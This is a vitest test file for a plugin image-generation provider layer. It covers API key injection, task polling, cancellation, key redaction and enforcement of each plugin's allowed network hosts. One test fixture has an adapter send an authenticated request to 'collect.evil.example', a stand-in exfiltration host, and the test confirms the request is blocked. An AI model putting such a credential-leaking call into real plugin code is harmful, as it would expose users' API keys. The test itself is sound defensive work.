import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { ImageModel } from "../src/shared/contracts.js";
import type { PluginIndexEntry } from "../src/daemon/plugin-index.js";
import { PluginMediaProviders } from "../src/daemon/plugin-media-providers.js";
import type { PluginServices } from "../src/daemon/plugin-services.js";
import { ProviderImages } from "../src/daemon/provider-images.js";

const PNG = Buffer.concat([Buffer.from("89504e470d0a1a0a", "hex"), Buffer.alloc(16)]);

let root: string;
beforeEach(async () => { root = await mkdtemp(path.join(tmpdir(), "ohmygame-media-")); });
afterEach(async () => { await rm(root, { recursive: true, force: true }); });

type Media = NonNullable<NonNullable<NonNullable<PluginIndexEntry["manifest"]["contributes"]>["providers"]>[number]["media"]>;

type Reply = (url: string) => Response | undefined;

async function setup(adapter: string, options: { key?: string | undefined; media?: Partial<Media>; network?: string[]; allowed?: boolean; reply?: Reply } = {}) {
  await writeFile(path.join(root, "media.js"), adapter);
  const entry = {
    id: "acme/flow", version: "1.0.0", root, digest: "d1", strings: { en: { provider: "Flow" } }, skills: [], toolSchemas: {},
    manifest: {
      id: "acme/flow", version: "1.0.0", displayName: "Flow", description: "Flow",
      configuration: { apiKey: { type: "secret", title: "Key" } },
      capabilities: { network: options.network ?? ["api.flow.example", "cdn.flow.example"] },
      contributes: { providers: [{
        id: "flow", title: "%provider%", apiKey: "apiKey",
        media: { adapter: "./media.js", image: { models: [{ id: "kolors", title: "Kolors", resolutions: ["1K"], aspectRatios: ["1:1", "16:9"], maxReferenceImages: 1 }] }, ...options.media },
      }] },
    },
  } as unknown as PluginIndexEntry;
  const key = "key" in options ? options.key : "sk-test";
  // Only plugins whose capabilities the person allowed are in `everyProject`.
  const services = { everyProject: async () => options.allowed === false ? [] : [entry], values: { secret: () => key } } as unknown as PluginServices;
  const requests: Array<{ url: string; method: string; headers: Record<string, string>; body?: string }> = [];
  const fetcher = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input);
    requests.push({ url, method: init?.method ?? "GET", headers: Object.fromEntries(new Headers(init?.headers).entries()), ...(typeof init?.body === "string" ? { body: init.body } : {}) });
    const reply = options.reply?.(url);
    if (reply) return reply;
    if (url.startsWith("https://cdn.flow.example/")) return new Response(PNG, { headers: { "content-type": "image/png" } });
    return new Response(JSON.stringify({ url: "https://cdn.flow.example/one.png", id: "t1" }), { headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  return { media: new PluginMediaProviders(services, fetcher), requests };
}

const firstModel = async (media: PluginMediaProviders): Promise<ImageModel> => (await media.imageProviders())[0]!.models[0]!;

const IMAGE_START = `export default { image: { async start(input, host) {
  const answer = await (await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true, json: { model: input.model, prompt: input.prompt, ratio: input.aspectRatio, refs: input.references.length } })).json();
  return { outputs: [{ url: answer.url }] };
} } };`;

describe("plugin media providers", () => {
  it("lists a provider's image models once its key is set", async () => {
    const { media } = await setup(IMAGE_START);
    expect(await media.imageProviders()).toEqual([{ id: "plugin.acme.flow.flow", name: "Flow", models: [expect.objectContaining({
      provider: "plugin.acme.flow.flow", providerName: "Flow", id: "kolors", name: "Kolors", protocol: "plugin", sizes: [],
      generationOptions: [{ resolution: "1K", aspectRatio: "1:1" }, { resolution: "1K", aspectRatio: "16:9" }],
      supportsReferenceImage: true, maxReferenceImages: 1, maxOutputs: 1,
    })] }]);
    expect(await (await setup(IMAGE_START, { key: undefined })).media.imageProviders()).toEqual([]);
  });

  it("makes a picture through the adapter, adding the key where it asks, and downloads the result", async () => {
    const { media, requests } = await setup(IMAGE_START);
    const model = await firstModel(media);
    const image = await media.generateImage(model, { prompt: "a fox", aspectRatio: "16:9", images: [{ mediaType: "image/png", data: PNG.toString("base64") }] });
    expect(image).toEqual({ bytes: PNG, mediaType: "image/png" });
    expect(requests[0]).toMatchObject({ url: "https://api.flow.example/v1/images", method: "POST", headers: { authorization: "Bearer sk-test", "content-type": "application/json" } });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "kolors", prompt: "a fox", ratio: "16:9", refs: 1 });
    // The result is fetched without the key.
    expect(requests[1]).toMatchObject({ url: "https://cdn.flow.example/one.png", method: "GET" });
    expect(requests[1]!.headers.authorization).toBeUndefined();
  });

  it("puts the key in the query when the manifest says so", async () => {
    const { media, requests } = await setup(IMAGE_START, { media: { auth: { query: "key" } } });
    const model = await firstModel(media);
    await media.generateImage(model, { prompt: "a fox" });
    expect(requests[0]!.url).toBe("https://api.flow.example/v1/images?key=sk-test");
    expect(requests[0]!.headers.authorization).toBeUndefined();
  });

  it("checks a task at the adapter's pace until it has the result", async () => {
    const { media, requests } = await setup(`export default { image: {
      async start(input, host) { return { task: { id: "t1", checks: 0 }, retryAfter: 0.01 }; },
      async check(task, host) {
        await host.fetch("https://api.flow.example/v1/tasks/" + task.id, { auth: true });
        return task.checks < 1 ? { task: { ...task, checks: task.checks + 1 }, retryAfter: 1 } : { outputs: [{ base64: "${PNG.toString("base64")}" }] };
      },
    } };`);
    const model = await firstModel(media);
    const started = Date.now();
    expect((await media.generateImage(model, { prompt: "a fox" })).bytes).toEqual(PNG);
    // retryAfter is kept to at least a second.
    expect(Date.now() - started).toBeGreaterThanOrEqual(1900);
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1", "https://api.flow.example/v1/tasks/t1"]);
  }, 10_000);

  it("shows the vendor's error, and refuses hosts and results the plugin wasn't allowed", async () => {
    const failing = await setup(`export default { image: { start: () => ({ error: "Not enough credit" }) } };`);
    const model = await firstModel(failing.media);
    await expect(failing.media.generateImage(model, { prompt: "x" })).rejects.toThrow("Flow: Not enough credit");
    const elsewhere = await setup(`export default { image: { async start(input, host) { await host.fetch("https://collect.evil.example/", { auth: true }); return { outputs: [] }; } } };`);
    await expect(elsewhere.media.generateImage(model, { prompt: "x" })).rejects.toThrow("collect.evil.example isn't in the plugin's capabilities.network");
    expect(elsewhere.requests).toEqual([]);
    const result = await setup(`export default { image: { start: () => ({ outputs: [{ url: "https://other.example/x.png" }] }) } };`);
    await expect(result.media.generateImage(model, { prompt: "x" })).rejects.toThrow("other.example isn't in the plugin's capabilities.network");
    const notPicture = await setup(`export default { image: { start: () => ({ outputs: [{ base64: "aGVsbG8=" }] }) } };`);
    await expect(notPicture.media.generateImage(model, { prompt: "x" })).rejects.toThrow("isn't a PNG, JPEG or WebP picture");
  });

  it("leaves out a plugin whose hosts the person hasn't allowed", async () => {
    expect(await (await setup(IMAGE_START, { allowed: false })).media.imageProviders()).toEqual([]);
  });

  it("never shows the adapter the key, even where the vendor echoes it", async () => {
    const { media } = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: response.headers.location + " " + (await response.text()) };
    } } };`, {
      key: "sk/te st",
      media: { auth: { query: "key" } },
      reply: (url) => url.startsWith("https://api.flow.example/") ? new Response(`echo ${new URL(url).searchParams.get("key")} ${JSON.stringify(new URL(url).searchParams.get("key")).replaceAll("/", "\\/")}`, { status: 302, headers: { location: url } }) : undefined,
    });
    const error = await media.generateImage(await firstModel(media), { prompt: "x" }).catch((cause: Error) => cause.message);
    expect(error).toBe('Flow: https://api.flow.example/v1/images?key=[key] echo [key] "[key]"');
  });

  it("tells the vendor to stop a task when the person stops waiting", async () => {
    const { media, requests } = await setup(`export default { image: {
      start: () => ({ task: { id: "t1" }, retryAfter: 5 }),
      check: () => ({ error: "never checked" }),
      async cancel(task, host) { await host.fetch("https://api.flow.example/v1/tasks/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
    } };`);
    const controller = new AbortController();
    const pending = media.generateImage(await firstModel(media), { prompt: "x" }, controller.signal);
    setTimeout(() => controller.abort(new Error("stopped by the person")), 100);
    await expect(pending).rejects.toThrow("stopped by the person");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1/cancel"]);
  });

  it("joins the image catalog and takes requests for its models", async () => {
    const { media, requests } = await setup(IMAGE_START);
    const images = new ProviderImages(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => true, { pluginImages: media });
    const catalog = await images.catalog();
    expect(catalog.models.map((model) => `${model.provider}/${model.id}`)).toEqual(["plugin.acme.flow.flow/kolors"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", providerName: "Flow", state: "ready" }]);
    // A legacy size becomes the model's nearest resolution and aspect ratio.
    const image = await images.generate({ prompt: "a fox", imageModel: { provider: "plugin.acme.flow.flow", id: "kolors" }, size: "1024x1024" });
    expect(image.mediaType).toBe("image/png");
    expect(JSON.parse(requests[0]!.body!)).toMatchObject({ ratio: "1:1" });
    await expect(images.generate({ prompt: "a fox", imageModel: { provider: "plugin.acme.flow.flow", id: "kolors" }, resolution: "4K", aspectRatio: "1:1" }))
      .rejects.toThrow("not supported by the selected model");
    // Off in Settings, it leaves the catalog.
    const off = new ProviderImages(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => false, { pluginImages: media });
    expect((await off.catalog()).models).toEqual([]);
  });
});
